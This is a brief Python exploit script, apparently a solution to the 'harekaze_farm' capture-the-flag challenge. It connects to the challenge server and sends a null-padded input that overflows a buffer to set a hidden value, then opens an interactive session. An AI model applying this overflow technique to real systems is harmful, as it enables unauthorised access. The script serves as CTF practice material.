from yeonnic import *

elf=ELF("./harekaze_farm")

#p=process("./harekaze_farm")
p=remote("problem.harekaze.com", 20328)
print p.recv()

p.sendline("123")
print p.recv()
p.sendline("cow".ljust(8,"\x00")+"isoroku")
print p.recv()
p.sendline("123")

p.interactive()

